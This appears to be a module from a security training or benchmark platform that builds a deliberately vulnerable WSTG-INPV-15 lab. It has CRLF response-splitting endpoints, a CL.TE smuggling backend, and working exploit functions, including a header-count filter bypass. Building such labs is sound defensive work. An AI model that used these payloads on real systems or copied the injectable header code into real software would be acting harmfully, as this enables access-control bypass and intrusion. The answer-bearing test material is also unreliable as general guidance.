// WSTG-INPV-15 (4.7.15) — HTTP Splitting / Smuggling.
//
// Two infra halves selected per deploy via classDef.infraVariant:
//
//   splitting — response-splitting via CRLF injection. Two endpoints both
//               build response headers from query parameters and emit them
//               via a raw-socket write (bypassing Node's built-in CRLF
//               hardening, which would otherwise reject the injection).
//               Every response also carries an X-Internal-Token header
//               whose value is the per-deploy canary. The canary header
//               sits AFTER the user-influenced header in the emitted byte
//               stream, so a CRLF injection that prematurely terminates
//               the legitimate header block surfaces the internal-token
//               header as response body bytes the HTTP client reads back.
//
//                 T0 — neither parameter is filtered. Either endpoint splits
//                      cleanly with \r\n\r\n in the user input.
//                 T1 — the redirect handler filters \r and \n out of the
//                      destination parameter before concatenating into
//                      Location, so the canonical payload fails. The
//                      preferences handler still concatenates name and
//                      value raw into Set-Cookie — splitting through
//                      prefNameParam (or prefValueParam) bypasses the
//                      T0-style filter and yields the canary the same way.
//
//   smuggling — CL/TE desync between an HAProxy frontend and a raw-net
//               Node backend. The backend is a custom net.createServer
//               that honours Content-Length when both CL and TE are
//               present. HAProxy honours Transfer-Encoding and forwards
//               the full chunked body. When CL says "stop after N bytes"
//               but HAProxy already forwarded the full chunked body, the
//               trailing bytes sit in the connection buffer and the
//               backend interprets them as a continuation request. The
//               second request inherits the frontend-added trusted-
//               upstream header (HAProxy attaches it on inbound; the
//               backend parses the smuggled bytes as a request that
//               arrived through HAProxy and so still carries the trust
//               marker). The backend's /<adminCanaryPath> endpoint only
//               returns the canary when the trusted-upstream header is
//               present, so the smuggled second request reaches the
//               privileged path.
//
//                 T0 — HAProxy forwards CL+TE requests unconditionally.
//                 T1 — HAProxy is meant to reject requests carrying both
//                      Content-Length and Transfer-Encoding. The rule
//                      uses hdr_cnt() which counts header lines, not
//                      values, so a single Transfer-Encoding line whose
//                      VALUE is "chunked , chunked" (or "chunked, chunked"
//                      with a trailing comma) passes the count check.
//                      HAProxy still honours the chunked encoding and
//                      the desync proceeds.

import { Scenario } from './scenario.mjs'

function stripCrlf(s) {
  return String(s == null ? '' : s).replace(/[\r\n]/g, '')
}

// Build the raw HTTP response bytes for a 302 redirect. The destination
// string is concatenated INTO the Location header. The trailing
// X-Internal-Token header carrying the canary is what a splitting
// injection surfaces as body bytes.
function buildRedirectBytes(destination, canary, internalTokenHeader) {
  const body = ''
  return (
    'HTTP/1.1 302 Found\r\n'
    + 'Location: ' + destination + '\r\n'
    + internalTokenHeader + ': ' + canary + '\r\n'
    + 'Content-Type: text/html; charset=utf-8\r\n'
    + 'Content-Length: ' + Buffer.byteLength(body) + '\r\n'
    + 'Connection: close\r\n'
    + '\r\n'
    + body
  )
}

// Build the raw HTTP response bytes for the preference confirmation. The
// preference name and value are concatenated INTO the Set-Cookie header.
function buildPrefBytes(name, value, canary, internalTokenHeader, pageHtml) {
  return (
    'HTTP/1.1 200 OK\r\n'
    + 'Set-Cookie: ' + name + '=' + value + '; Path=/\r\n'
    + internalTokenHeader + ': ' + canary + '\r\n'
    + 'Content-Type: text/html; charset=utf-8\r\n'
    + 'Content-Length: ' + Buffer.byteLength(pageHtml) + '\r\n'
    + 'Connection: close\r\n'
    + '\r\n'
    + pageHtml
  )
}

// What the runtime's send() wrapper sees as the response body. The runtime
// only uses it for canary-includes-based solve attribution and would write
// it to the socket via res.end() — except we have already detached the
// socket, so res.end() is a no-op. Passing the canary string here keeps
// the solve detector accurate for split responses.
function solveDetectorBody(canary, splitOccurred) {
  return splitOccurred ? canary : ''
}

export const classDef = {
  wstgId: 'WSTG-INPV-15',
  class: 'HTTP Splitting / Smuggling (CRLF response splitting + CL/TE request smuggling)',
  defenceTiers: [0, 1],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  infraVariant: (s) => s.infraVariant || 'splitting',
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.redirectPath,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.redirectPath),

  matchesRequest({ reqUrl, req, scenario }) {
    if (req.method !== 'GET') return false
    // Splitting variant: the runtime serves both header-building sinks. The
    // smuggling backend is NOT served by the runtime — the smuggling
    // Dockerfile boots a separate entrypoint (smuggling-backend.mjs) and
    // the standard runtime is bypassed entirely. If we ever land on the
    // runtime under the smuggling variant (local dev, mistake), the
    // redirect/pref endpoints still respond — useful for chrome rendering
    // discovery.
    return reqUrl.pathname === scenario.redirectPath
        || reqUrl.pathname === scenario.prefPath
  },

  async handleRequest({ req, reqUrl, scenario, renderPage, manifest }) {
    const tier = manifest.defenceTier || 0
    const canary = manifest.perDeployCanary
    const internalHeader = scenario.internalTokenHeader

    // Redirect endpoint.
    if (reqUrl.pathname === scenario.redirectPath) {
      const destRaw = reqUrl.searchParams.get(scenario.redirectParam)
      if (destRaw == null || destRaw === '') {
        return {
          status: 200,
          body: renderPage(scenario.redirectPageBody),
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        }
      }
      // T1: filter CR/LF out of the destination before concatenating.
      const destination = tier >= 1 ? stripCrlf(destRaw) : destRaw
      const bytes = buildRedirectBytes(destination, canary, internalHeader)

      const splitOccurred = /\r\n\r\n/.test(destination)
      writeRawAndDetach(req, bytes)
      return {
        status: 302,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
        body: solveDetectorBody(canary, splitOccurred),
        __rawWritten: true,
      }
    }

    // Preferences endpoint.
    if (reqUrl.pathname === scenario.prefPath) {
      const nameRaw = reqUrl.searchParams.get(scenario.prefNameParam)
      const valueRaw = reqUrl.searchParams.get(scenario.prefValueParam)
      if (nameRaw == null || valueRaw == null) {
        return {
          status: 200,
          body: renderPage(scenario.prefPageBody),
          headers: { 'Content-Type': 'text/html; charset=utf-8' },
        }
      }
      // Both tiers concatenate name and value raw. This is the T1 bypass
      // sink — the redirect filter does not extend to this surface.
      const name = nameRaw
      const value = valueRaw
      const pageHtml = renderPage(scenario.prefPageBody)
      const bytes = buildPrefBytes(name, value, canary, internalHeader, pageHtml)

      const splitOccurred = /\r\n\r\n/.test(name) || /\r\n\r\n/.test(value)
      writeRawAndDetach(req, bytes)
      return {
        status: 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
        body: solveDetectorBody(canary, splitOccurred),
        __rawWritten: true,
      }
    }

    return { status: 404, body: renderPage('<p>Not found.</p>') }
  },

  // Canonical exploit. Dispatches on infraVariant.
  //   splitting/T0 — split via redirectParam
  //   splitting/T1 — split via prefNameParam (redirect param is filtered)
  //   smuggling/T0 — CL.TE desync forwarding a GET /admin/canary continuation
  //   smuggling/T1 — bypass HAProxy's header-count filter with a single
  //                  Transfer-Encoding value containing two comma-separated
  //                  "chunked" tokens
  async fireExploit({ baseUrl, scenario, payload }) {
    const variant = scenario.infraVariant || 'splitting'

    if (variant === 'smuggling') {
      const teHeader = (payload === 't1-smuggle-teval-bypass')
        ? 'chunked , chunked'
        : 'chunked'
      return await rawSmuggle({ baseUrl, scenario, teHeader })
    }

    if (payload === 't1-pref-split') {
      const inj = '\r\n\r\n'  // bare CRLF pair — http client encodes for us
      const name = 'theme' + inj
      const url = new URL(scenario.prefPath, baseUrl)
      url.searchParams.set(scenario.prefNameParam, name)
      url.searchParams.set(scenario.prefValueParam, 'dark')
      const r = await rawFetch(url.toString())
      return r
    }
    // Default: T0 split via redirectParam.
    const inj = '\r\n\r\n'
    const dest = '/' + inj
    const url = new URL(scenario.redirectPath, baseUrl)
    url.searchParams.set(scenario.redirectParam, dest)
    return await rawFetch(url.toString())
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    typeof responseBody === 'string' && responseBody.includes(perDeployCanary),
}

// ────────────────────────────────────────────────────────────────────────
// Smuggling backend — exported for the smuggling Dockerfile entrypoint to
// run instead of the standard runtime.
//
// A raw net.createServer parser that:
//   1. Reads request bytes until a complete header block (\r\n\r\n).
//   2. When BOTH Content-Length and Transfer-Encoding are present, honours
//      Content-Length (the classic CL.TE backend behaviour).
//   3. Reads CL bytes as the body and discards them; the rest sits in the
//      connection buffer until the next read.
//   4. Loops back to step 1 with whatever bytes remain — interpreting them
//      as the next pipelined request from the same upstream.
//
// The admin endpoint at scenario.adminCanaryPath returns the canary only
// when the trustedUpstreamHeader has value trustedUpstreamValue. HAProxy
// sets that header on every inbound request and strips any client-supplied
// copy, so direct unsmuggled requests cannot satisfy it. The smuggled
// second request DOES carry it because the backend never re-parsed the
// connection — the trust header from the first request's headers is the
// only state the smuggled bytes inherit at the connection level. But the
// backend implementation here re-parses each request from scratch, so
// inheritance happens because the SMUGGLED REQUEST CARRIES IT INLINE: when
// the attacker pipelines the second request inside the body of the first,
// they include the trusted-upstream header in the smuggled request bytes
// themselves. HAProxy never sees the second request (it lived inside the
// first request's body), so HAProxy's strip-then-add cycle does not run on
// it — the backend reads the attacker-supplied header value verbatim.
// ────────────────────────────────────────────────────────────────────────
export async function runSmugglingBackend({ scenario, canary, port }) {
  const net = await import('node:net')
  const server = net.createServer((socket) => {
    let buf = Buffer.alloc(0)
    socket.on('data', (chunk) => {
      buf = Buffer.concat([buf, chunk])
      // Drain as many pipelined requests as the buffer holds.
      while (true) {
        const result = tryConsumeRequest(buf)
        if (!result) break
        buf = result.remaining
        const resp = handleSmuggledRequest(result.request, scenario, canary)
        try { socket.write(resp) } catch { /* socket gone */ }
        if (result.request.headers['connection'] === 'close') {
          try { socket.end() } catch {}
          return
        }
      }
    })
    socket.on('error', () => {})
  })
  server.listen(port, '127.0.0.1')
  return server
}

// Parse one HTTP request from buf using a CL-strict parser. Returns
// { request, remaining } or null if buf does not yet contain a complete
// request. Body length is determined by Content-Length only; Transfer-
// Encoding is IGNORED at the backend, which is the CL-side of the CL.TE
// desync.
function tryConsumeRequest(buf) {
  // RFC 7230 §3.5 — tolerate leading CRLF / chunked-leftover bytes before
  // the request line. After a CL.TE desync the next request often starts
  // with chunk-terminator residue (e.g. `\r\n0\r\n\r\n`) that's not part
  // of either request semantically. Skip past those bytes until the
  // first capital-letter byte that could begin a method token.
  let start = 0
  while (start < buf.length) {
    const c = buf[start]
    // A-Z is 0x41-0x5A
    if (c >= 0x41 && c <= 0x5A) break
    start += 1
  }
  if (start >= buf.length) return null
  const slice = buf.slice(start)
  const sep = slice.indexOf('\r\n\r\n')
  if (sep < 0) return null
  const headerText = slice.slice(0, sep).toString('utf-8')
  const lines = headerText.split('\r\n')
  const requestLine = lines[0] || ''
  const m = requestLine.match(/^([A-Z]+)\s+(\S+)\s+HTTP\/\d\.\d$/)
  if (!m) return null
  const method = m[1]
  const target = m[2]
  const headers = {}
  for (let i = 1; i < lines.length; i++) {
    const line = lines[i]
    const idx = line.indexOf(':')
    if (idx < 0) continue
    const k = line.slice(0, idx).trim().toLowerCase()
    const v = line.slice(idx + 1).trim()
    headers[k] = v
  }
  const cl = parseInt(headers['content-length'] || '0', 10)
  const bodyStart = sep + 4
  const bodyEnd = bodyStart + (isNaN(cl) ? 0 : cl)
  if (slice.length < bodyEnd) return null
  const body = slice.slice(bodyStart, bodyEnd).toString('utf-8')
  const remaining = slice.slice(bodyEnd)
  return { request: { method, target, headers, body }, remaining }
}

function handleSmuggledRequest(req, scenario, canary) {
  const trustHeader = (scenario.trustedUpstreamHeader || 'X-Trusted-Upstream').toLowerCase()
  const trustValue = scenario.trustedUpstreamValue || 'haproxy-edge'
  const carriesTrust = (req.headers[trustHeader] || '').trim() === trustValue
  const path = (req.target || '/').split('?')[0]

  if (path === scenario.adminCanaryPath) {
    if (!carriesTrust) {
      const body = 'forbidden — admin path requires an upstream trust marker\n'
      return buildBackendResponse(403, 'text/plain; charset=utf-8', body)
    }
    const html = (scenario.adminPageBody || '<p>{CANARY}</p>').replace('{CANARY}', canary)
    return buildBackendResponse(200, 'text/html; charset=utf-8', html)
  }

  // Generic 200 for non-admin paths so HAProxy health probes succeed.
  return buildBackendResponse(200, 'text/plain; charset=utf-8', 'ok\n')
}

function buildBackendResponse(status, contentType, body) {
  const statusText = status === 200 ? 'OK' : (status === 403 ? 'Forbidden' : 'Internal Server Error')
  return (
    `HTTP/1.1 ${status} ${statusText}\r\n`
    + `Content-Type: ${contentType}\r\n`
    + `Content-Length: ${Buffer.byteLength(body)}\r\n`
    + `Connection: keep-alive\r\n`
    + `\r\n`
    + body
  )
}

// ────────────────────────────────────────────────────────────────────────
// Raw-socket write helper (splitting variant).
//
// Node's http module rejects CR/LF in header values (ERR_INVALID_CHAR) so
// the only path to a real split response is to write the raw bytes to the
// TCP socket and close it. The runtime's subsequent send() call lands on
// an already-closed socket and silently no-ops (the http module's writer
// catches the closed-socket state). The byte stream the client receives
// is purely the split response we wrote here.
// ────────────────────────────────────────────────────────────────────────
function writeRawAndDetach(req, rawBytes) {
  const socket = req.socket
  if (!socket || socket.destroyed) return
  try { socket.write(rawBytes) } catch { /* socket gone */ }
  try { socket.end() } catch { /* already ended */ }
}

// Raw-fetch — a TCP client that does NOT collapse / re-parse the response,
// so the bytes emitted after the response split show up in the captured
// body. fetch/undici parses headers strictly and would discard the
// smuggled second-response bytes from view, so we use a net socket here.
async function rawFetch(urlString) {
  const u = new URL(urlString)
  const isHttps = u.protocol === 'https:'
  const host = u.hostname
  const port = parseInt(u.port || (isHttps ? '443' : '80'), 10)
  const pathQ = u.pathname + (u.search || '')
  const reqLine = (
    `GET ${pathQ} HTTP/1.1\r\n`
    + `Host: ${host}${u.port ? ':' + u.port : ''}\r\n`
    + `Connection: close\r\n`
    + `\r\n`
  )
  // Plain TCP for http; TLS for https (Fly requires TLS on *.fly.dev).
  const transport = isHttps
    ? await import('node:tls')
    : await import('node:net')
  return await new Promise((resolve) => {
    const onConnect = () => sock.write(reqLine)
    const sock = isHttps
      ? transport.connect({ host, port, servername: host }, onConnect)
      : transport.connect(port, host, onConnect)
    let buf = Buffer.alloc(0)
    sock.on('data', (d) => { buf = Buffer.concat([buf, d]) })
    sock.on('end', () => {
      const text = buf.toString('utf-8')
      const firstLine = text.split('\r\n', 1)[0] || ''
      const m = firstLine.match(/^HTTP\/\d\.\d (\d{3})/)
      // Return only the body portion (after the first \r\n\r\n header-body
      // separator). The X-Internal-Token canary header should only surface
      // here when a successful split moved subsequent header lines past
      // the header-body boundary; at T1 with the CRLF filter, the header
      // stays inside the headers block and never reaches body.
      const sepIdx = text.indexOf('\r\n\r\n')
      const body = sepIdx >= 0 ? text.slice(sepIdx + 4) : text
      resolve({ status: m ? parseInt(m[1], 10) : 0, body })
    })
    sock.on('error', () => resolve({ status: 0, body: '' }))
  })
}

// ────────────────────────────────────────────────────────────────────────
// Smuggling exploit primitive — send a CL.TE payload through the frontend
// and read whatever the backend pipelines back. The body is chunked-
// encoded so HAProxy honours TE and forwards every byte; the Content-
// Length header is short enough that the backend stops reading partway
// through, leaving the smuggled second request in the connection buffer.
// ────────────────────────────────────────────────────────────────────────
async function rawSmuggle({ baseUrl, scenario, teHeader }) {
  const u = new URL(baseUrl)
  const isHttps = u.protocol === 'https:'
  const host = u.hostname
  const port = parseInt(u.port || (isHttps ? '443' : '80'), 10)
  const trustHeader = scenario.trustedUpstreamHeader || 'X-Trusted-Upstream'
  const trustValue = scenario.trustedUpstreamValue || 'haproxy-edge'

  // Smuggled second request: targets the admin canary path and carries
  // the trusted-upstream header inline so the backend treats it as
  // upstream-originated.
  const smuggled = (
    `GET ${scenario.adminCanaryPath} HTTP/1.1\r\n`
    + `Host: ${host}\r\n`
    + `${trustHeader}: ${trustValue}\r\n`
    + `Content-Length: 0\r\n`
    + `\r\n`
  )

  // CL.TE body: one chunk ("A"), terminator chunk, then the smuggled
  // request bytes. HAProxy reads the full chunked body (5 chunked bytes
  // + smuggled request). The backend honours Content-Length: 4 and stops
  // after "1\r\nA\r\n"; the rest is the smuggled request.
  const chunkedBody = `1\r\nA\r\n0\r\n\r\n${smuggled}`
  const cl = 4   // length of "1\r\nA\r\n"

  const firstReq = (
    `POST ${scenario.redirectPath} HTTP/1.1\r\n`
    + `Host: ${host}\r\n`
    + `Content-Length: ${cl}\r\n`
    + `Transfer-Encoding: ${teHeader}\r\n`
    + `\r\n`
    + chunkedBody
  )

  const transport = isHttps
    ? await import('node:tls')
    : await import('node:net')
  return await new Promise((resolve) => {
    const onConnect = () => sock.write(firstReq)
    const sock = isHttps
      ? transport.connect({ host, port, servername: host }, onConnect)
      : transport.connect(port, host, onConnect)
    let buf = Buffer.alloc(0)
    sock.on('data', (d) => { buf = Buffer.concat([buf, d]) })
    const finish = () => {
      const text = buf.toString('utf-8')
      // Concatenate all pipelined response bodies and return them as the
      // body field. The canary may land in any pipelined response.
      const bodies = splitPipelinedResponses(text).map(r => r.body).join('\n')
      resolve({ status: 200, body: bodies + '\n' + text })
    }
    sock.on('end', finish)
    sock.on('error', finish)
    // The backend keeps the connection alive (Connection: keep-alive in
    // its responses), so we close after a short wait once data has
    // stopped arriving.
    let timer = null
    const arm = () => {
      if (timer) clearTimeout(timer)
      timer = setTimeout(() => { try { sock.end() } catch {}; finish() }, 1500)
    }
    sock.on('data', arm)
    arm()
  })
}

// Split a stream of pipelined HTTP responses into individual {status, body}
// entries. CL-based parser — assumes each response has a Content-Length.
function splitPipelinedResponses(text) {
  const out = []
  let i = 0
  while (i < text.length) {
    const sep = text.indexOf('\r\n\r\n', i)
    if (sep < 0) break
    const headerText = text.slice(i, sep)
    const lines = headerText.split('\r\n')
    const statusLine = lines[0] || ''
    const m = statusLine.match(/^HTTP\/\d\.\d (\d{3})/)
    const status = m ? parseInt(m[1], 10) : 0
    let cl = 0
    for (const line of lines.slice(1)) {
      const idx = line.indexOf(':')
      if (idx < 0) continue
      if (line.slice(0, idx).trim().toLowerCase() === 'content-length') {
        cl = parseInt(line.slice(idx + 1).trim(), 10) || 0
      }
    }
    const bodyStart = sep + 4
    const bodyEnd = bodyStart + cl
    out.push({ status, body: text.slice(bodyStart, bodyEnd) })
    i = bodyEnd
  }
  return out
}

export const __test = {
  buildRedirectBytes,
  buildPrefBytes,
  stripCrlf,
  rawFetch,
  tryConsumeRequest,
  handleSmuggledRequest,
  buildBackendResponse,
  splitPipelinedResponses,
}
